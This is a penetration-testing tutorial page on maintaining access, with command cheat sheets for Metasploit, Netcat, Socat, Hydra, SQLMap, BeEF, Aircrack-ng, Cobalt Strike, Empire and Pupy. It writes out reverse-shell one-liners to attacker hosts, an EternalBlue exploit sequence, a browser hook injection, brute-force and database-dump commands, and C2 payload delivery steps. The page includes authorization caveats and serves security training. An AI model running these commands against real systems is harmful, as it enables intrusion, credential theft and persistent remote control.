Phase 4

Maintaining Access

Maintaining access involves creating persistent backdoors or covert channels to retain control over a compromised system, simulating how real attackers ensure long-term infiltration.

Understanding Maintaining Access

>Maintaining access is a crucial phase in penetration testing where attackers ensure they can retain control over compromised systems. This phase includes installing backdoors, creating user accounts, and using remote administration tools to persist access even after reboots or detection.

Persistence Methods

Use of scheduled tasks, startup scripts, or registry changes to survive reboots.

Remote Access Tools

Deploying tools like Metasploit or Netcat for continuous shell access.

Featured Tools

Nmap

A powerful network scanning tool used for host discovery, port scanning, service detection, and vulnerability enumeration.

Port Scanning Service Detection Open Source
Run
How to Use Nmap
nmap -sV 192.168.1.1
🔹 Description:

Nmap (Network Mapper) is a powerful open-source tool used for network exploration and security auditing. It can detect live hosts, open ports, running services, and known vulnerabilities.

🚀 Common Use Cases:
  • Scan a single host:
    nmap 192.168.1.1
  • Scan multiple IPs:
    nmap 192.168.1.1 192.168.1.2
  • Scan a range:
    nmap 192.168.1.1-50
  • Service and version detection:
    nmap -sV 192.168.1.1
  • OS detection and traceroute:
    nmap -A 192.168.1.1
📘 Explanation of Flags:
  • -sS — Stealth SYN scan (default)
  • -sV — Detect service versions
  • -O — Detect OS (requires root)
  • -A — Aggressive scan (OS, version, script, traceroute)
  • -T4 — Speed up the scan (good balance between speed and accuracy)
⚠️ Notes:
  • Use sudo for full scan capabilities (like OS detection).
  • Ensure you have permission before scanning networks.
  • Nmap also supports script scanning using --script for vulnerability testing.
Metasploit Framework

A powerful exploitation framework used to test, validate, and exploit system vulnerabilities in ethical hacking scenarios.

Exploitation Payloads Open Source
Run
How to Use Metasploit Framework 
msfconsole
🔹 Description:

Metasploit Framework is one of the most advanced and popular platforms for penetration testing. It enables security professionals to discover, exploit, and validate vulnerabilities through modular components.

🚀 Common Use Cases:
  1. Start Metasploit:
    msfconsole
  2. Search for an exploit:
    search ms17_010
  3. Select the module:
    use exploit/windows/smb/ms17_010_eternalblue
  4. Set target IP:
    set RHOST 192.168.1.10
  5. Select payload:
    set PAYLOAD windows/meterpreter/reverse_tcp
  6. Set local host and port:
    set LHOST 192.168.1.5
    set LPORT 4444
  7. Run the exploit:
    exploit
📘 Explanation of Terms:
  • exploit — The vulnerability to use
  • payload — The code that runs on the target after exploitation
  • RHOST — Remote Host (target IP)
  • LHOST — Local Host (attacker's IP)
  • session — Interaction with the exploited system
⚠️ Notes:
  • Always update Metasploit regularly with msfupdate
  • Use in legal and authorized environments only
  • Metasploit supports a wide range of auxiliary tools and post-exploitation modules
Netcat

A lightweight tool used for port scanning, file transfers, banner grabbing, and reverse shells. Known as the “Swiss Army knife” of networking.

Networking TCP/UDP Open Source
How to Use Netcat
nc -lvnp 4444
🔹 Description:

Netcat (nc) is a powerful networking tool that enables raw TCP/UDP connections for testing, reverse shells, banner grabbing, and transferring files between systems.

🚀 Common Use Cases:
  1. Start a listener on port 4444:
    nc -lvnp 4444
  2. Connect to a listener (e.g., reverse shell):
    nc [attacker-ip] 4444 -e /bin/bash
  3. Send a file:
    nc [target-ip] 1234 < file.txt
  4. Receive a file:
    nc -lvnp 1234 > received.txt
  5. Scan open ports on a target:
    nc -zv 192.168.1.1 1-1000
📘 Explanation of Flags:
  • -l — Listen mode for incoming connections
  • -v — Verbose output
  • -n — Disable DNS resolution
  • -p — Specify local port
  • -z — Zero-I/O mode (for scanning)
  • -e — Execute a program after connection (e.g., /bin/bash)
⚠️ Notes:
  • The -e flag is disabled in some Netcat versions (e.g., OpenBSD’s).
  • Use responsibly—Netcat can create backdoors or reverse shells.
  • Use only in environments where you have permission to test.

Meterpreter

A powerful in-memory payload used within Metasploit to interact with a compromised system and perform post-exploitation tasks.

Post-Exploitation Payload Interactive Shell
How to Use Meterpreter
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
🔹 Description:

Meterpreter is an advanced, dynamic payload that operates through Metasploit. It allows attackers to maintain an interactive shell, capture keystrokes, take screenshots, pivot through the network, and much more—all in memory without touching disk.

🚀 Common Use Cases:
  • Open a reverse shell: set PAYLOAD windows/meterpreter/reverse_tcp
  • Start handler: use exploit/multi/handler
  • Set LHOST/LPORT: set LHOST <your-ip>
    set LPORT 4444
  • Run handler: run
📘 Popular Meterpreter Commands:
  • sysinfo — Get system info
  • shell — Spawn a system shell
  • screenshot — Capture desktop image
  • keyscan_start — Begin keystroke logging
  • download / upload — Transfer files
  • migrate — Move Meterpreter to another process
⚠️ Notes:
  • Meterpreter sessions run in memory only—stealthier than typical payloads.
  • Antivirus may detect it unless obfuscated or encoded.
  • Use responsibly in labs or authorized environments only.
Hydra

A fast and flexible login cracker supporting numerous protocols. Used for testing the strength of authentication mechanisms.

Brute Force Login Cracking Open Source
How to Use Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
🔹 Description:

Hydra (also known as THC-Hydra) is a powerful tool for performing dictionary-based brute-force attacks against multiple protocols such as SSH, FTP, HTTP, MySQL, and more.

🚀 Common Use Cases:
  • Brute-force SSH login:
    hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
  • Brute-force FTP login:
    hydra -L users.txt -P passwords.txt ftp://192.168.1.20
  • HTTP GET form cracking:
    hydra -l admin -P wordlist.txt 192.168.1.30 http-get
📘 Explanation of Flags:
  • -l — Single username
  • -L — File containing list of usernames
  • -P — File containing passwords
  • -s — Port number (optional if non-default)
  • -V — Verbose mode (show each attempt)
⚠️ Notes:
  • Brute-force attacks can be loud—use rate limiting and stealth tactics.
  • Only test systems you are authorized to audit.
  • Use -t to adjust number of parallel threads (default is 16).
John the Ripper

A fast and powerful password cracker used for testing password strength and recovering lost credentials.

Password Cracking Hash Recovery Open Source
How to Use John the Ripper
john /path/to/hash.txt
🔹 Description:

John the Ripper is a popular open-source password cracking tool. It can crack various types of password hashes using dictionary attacks, brute force, and hybrid techniques.

🚀 Common Use Cases:
  • Basic hash cracking:
    john hashes.txt
  • Use a custom wordlist:
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  • Show cracked passwords:
    john --show hashes.txt
  • Crack ZIP file password:
    zip2john secret.zip > hash.txt
    john hash.txt
📘 Explanation of Features:
  • --wordlist — Use a specific wordlist instead of brute force
  • --show — Display cracked password results
  • zip2john — Convert ZIP file to crackable hash format
  • john --format= — Specify hash type manually (if needed)
⚠️ Notes:
  • Supports many hash types: MD5, SHA1, bcrypt, ZIP, PDF, and more.
  • Use responsibly to test password security, not for unauthorized access.
  • Use --format=raw-md5 or similar if auto-detection fails.
Armitage

A graphical cyber attack management tool for Metasploit. It visualizes targets and exploits for easier collaboration and rapid operations.

GUI Metasploit Team Collaboration
How to Use Armitage
armitage
🔹 Description:

Armitage is a GUI front-end for the Metasploit Framework. It supports red team collaboration by allowing multiple users to visualize, exploit, and manage compromised systems together in real-time.

🚀 Common Use Cases:
  • Launch Armitage:
    armitage
  • Connect to Metasploit:
    Use the default connection prompt to start the Metasploit RPC daemon and connect to it.
  • Scan a network:
    Use Hosts → Nmap Scan or import results to map live systems.

⚠️ Notes:

  • You must have Metasploit installed and properly configured.
  • Armitage is no longer actively maintained but still widely used for training and CTFs.
BeEF

A powerful browser exploitation tool that allows red teams to control browsers and launch client-side attacks using JavaScript hooks.

Post-Exploitation Browser Exploitation JavaScript
How to Use BeEF (Browser Exploitation Framework)
beef-xss
🔹 Description:

BeEF is a post-exploitation framework that focuses on browser vulnerabilities. It allows penetration testers to hook a target browser and perform various attacks using the browser context.

🚀 Common Use Cases:
  • Start BeEF server:
    beef-xss
  • Access the admin UI:
    Open browser and go to http://127.0.0.1:3000/ui/panel
  • Inject the hook into a target page:
    <script src="http://your-ip:3000/hook.js"></script>
  • Control hooked browsers:
    Use the BeEF panel to execute payloads and modules
📘 Key Features:
  • Command execution in browser context
  • Social engineering and phishing modules
  • Network discovery from hooked browser
  • Integration with Metasploit
⚠️ Notes:
  • BeEF runs a web interface and a RESTful API—make sure ports 3000 and 6789 are open.
  • Only use BeEF in labs or with explicit authorization.
  • Hooked browsers appear in real-time in the control panel.

RouterSploit is a modular exploitation framework targeting embedded devices like routers, modems, IP cameras, and IoT gadgets. It includes modules for exploits, scanners, payloads, and credentials testing.

Aircrack-ng

A complete suite of tools for assessing Wi-Fi network security, including packet capture, deauthentication, and password cracking.

Wireless Password Cracking Open Source
How to Use Aircrack-ng
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
🔹 Description:

Aircrack-ng is a suite of tools for Wi-Fi network security assessment. It can capture packets, perform attacks (e.g. deauth), crack WPA/WPA2 handshakes, and analyze signal strength and encryption types.

🚀 Common Use Cases:
  • Put Wi-Fi adapter in monitor mode:
    airmon-ng start wlan0
  • Capture handshake with airodump-ng:
    airodump-ng wlan0mon
  • Target specific AP:
    airodump-ng --bssid [AP_MAC] -c [channel] -w capture wlan0mon
  • Deauthenticate a client (to force handshake):
    aireplay-ng --deauth 10 -a [AP_MAC] -c [Client_MAC] wlan0mon
  • Crack captured handshake:
    aircrack-ng capture.cap -w wordlist.txt
📘 Explanation of Tools:
  • airmon-ng — Enable monitor mode on wireless adapter
  • airodump-ng — Capture traffic and handshakes
  • aireplay-ng — Inject packets (e.g., deauth)
  • aircrack-ng — Crack captured WPA handshakes
⚠️ Notes:
  • You need a Wi-Fi adapter that supports monitor mode and packet injection.
  • Use in legal penetration testing labs or authorized networks only.
  • Use --bssid and -c for targeted attacks to speed up cracking.
SQLMap

An automated tool for detecting and exploiting SQL injection flaws and taking over database servers.

Database SQL Injection Open Source
How to Use SQLMap
sqlmap -u "http://example.com/page.php?id=1" --batch
🔹 Description:

SQLMap is a powerful tool used to automate the process of detecting and exploiting SQL injection vulnerabilities in web applications. It supports a wide range of databases and injection techniques.

🚀 Common Use Cases:
  • Basic injection test:
    sqlmap -u "http://example.com/page.php?id=1"
  • Dump entire database:
    sqlmap -u "http://example.com/page.php?id=1" --dump
  • List available databases:
    sqlmap -u "http://example.com/page.php?id=1" --dbs
  • Extract specific table:
    sqlmap -u "URL" -D dbname -T tablename --dump
  • Bypass WAF:
    sqlmap -u "URL" --tamper=between
📘 Explanation of Options:
  • -u — Target URL
  • --batch — Skip user prompts (auto-answer)
  • --dbs — List databases
  • --tables — List tables in a database
  • --dump — Extract data
⚠️ Notes:
  • Always have permission to test the target application.
  • SQLMap can be very noisy — use with care on production systems.
  • Use --risk and --level to adjust test intensity.
Socat

A powerful command-line utility for bidirectional data transfer between two independent data channels — ideal for port forwarding and reverse shells.

Networking Tunneling Open Source
How to Use Socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
🔹 Description:

Socat (SOcket CAT) is a multipurpose relay tool that connects two endpoints — such as files, pipes, sockets, or ports. It's commonly used for reverse shells, encrypted tunnels, and remote port forwarding.

🚀 Common Use Cases:
  • Spawn a listener that launches a shell:
    socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
  • Connect to the listener (reverse shell):
    socat TCP:[attacker-ip]:4444 EXEC:/bin/bash
  • Encrypted reverse shell (with OpenSSL):
    socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem EXEC:/bin/bash
  • Forward local port to remote host:
    socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
📘 Explanation of Flags:
  • TCP-LISTEN:PORT — Listens for incoming TCP connections on specified port
  • EXEC:/bin/bash — Executes the given command
  • reuseaddr — Allows socket reuse
  • fork — Handles multiple connections simultaneously
⚠️ Notes:
  • Socat is very flexible but can be dangerous — use only in authorized testing environments.
  • Encrypted channels require proper SSL certificates.
  • Make sure the target system has socat installed for both ends of communication.
Cobalt Strike

A commercial threat emulation tool used by red teams for post-exploitation, covert command-and-control, and lateral movement in networks.

Post-Exploitation C2 Commercial
How to Use Cobalt Strike 
./teamserver [your-ip] [password]

Cobalt Strike is a commercial adversary simulation platform designed for red teams to model advanced threat actor behaviors. It supports Beacon payloads, command and control (C2), privilege escalation, credential harvesting, and more.

🚀 Common Use Workflow:
  1. Start the team server on attack machine:
    ./teamserver 192.168.1.10 cobalt123
  2. Connect from the Cobalt Strike GUI:
    Launch the Cobalt Strike client → enter IP and password
  3. Generate Beacon payload:
    Choose HTTP/HTTPS, staging or unstaged, and target type
  4. Deliver the payload:
    Use phishing, exploits, or physical access
  5. Interact with infected hosts:
    Use Beacon for post-exploitation (e.g., ps, keylogger, shell, etc.)
📘 Key Features:
  • Beacon Payloads: Covert communication over HTTP, HTTPS, DNS
  • Pivoting: Lateral movement within the network
  • Post-Exploitation Modules: Mimikatz, keystroke logging, screenshot capture, etc.
  • Reports: Automatically generate red team reports
⚠️ Legal and Licensing Notes:
  • Cobalt Strike is a **commercial tool** — it requires a valid license.
  • **Use only in environments where you have explicit permission** (e.g., penetration test or red team engagement).
  • Unauthorized use is illegal and unethical.
Empire

A post-exploitation and C2 framework that uses PowerShell and Python agents for stealthy control of compromised systems.

C2 Post-Exploitation Open Source
How to Use Empire Framework
sudo ./empire
🔹 Description:

Empire is a post-exploitation framework that uses encrypted communications via PowerShell or Python agents to maintain stealthy control over compromised systems. It supports modular payloads, lateral movement, and privilege escalation tools.

🚀 Basic Workflow:
  1. Start Empire server:
    sudo ./empire
  2. Launch listener:
    listeners → uselistener http → execute
  3. Generate agent stager (payload):
    usestager windows/launcher_bat
  4. Deliver payload:
    Use phishing, exploits, or dropper to run agent on target
  5. Interact with compromised host:
    agents → interact AGENT_NAME
📘 Core Components:
  • Listeners: Handle incoming agent traffic (HTTP, HTTPS, etc.)
  • Stagers: Generate one-liners or files to deploy agents
  • Modules: Built-in tools for tasks like privilege escalation, keylogging, dumping hashes, etc.
⚠️ Notes:
  • Empire is designed for red team assessments — **use only on systems you’re authorized to test**.
  • It includes modules for Windows and Linux environments.
  • Make sure to install dependencies via ./setup/install.sh before first use.
Pupy

A multi-platform remote administration and post-exploitation tool with in-memory execution and encrypted C2 channels.

C2 RAT Open Source
How to Use Pupy
./pupysh.py
🔹 Description:

Pupy is an advanced, cross-platform post-exploitation and RAT framework written in Python. It enables fileless in-memory payloads, encrypted communications, persistence modules, and remote control over Windows, Linux, macOS, and Android.

🚀 Common Use Workflow:
  1. Start the Pupy server:
    ./pupysh.py
  2. Generate a payload (e.g., Windows executable):
    ./pupygen.py -f exe_x86 connect --host 192.168.1.100 --transport ssl
  3. Deliver the payload to the target:
    Via phishing, exploits, or USB dropper
  4. Wait for incoming sessions and interact:
    sessions → interact 0
📘 Features:
  • In-memory execution: No disk writes needed
  • Encrypted C2 channels: SSL, HTTP, WebSockets, etc.
  • Cross-platform agents: Windows, Linux, macOS, Android
  • Modular toolkit: Keylogger, shell, screenshot, persistence, and more
⚠️ Notes:
  • Run in Python 2.7 environment (or use Docker if supported)
  • Only use Pupy for ethical hacking with explicit permission
  • Some antivirus solutions may block payload generation — test in isolated labs
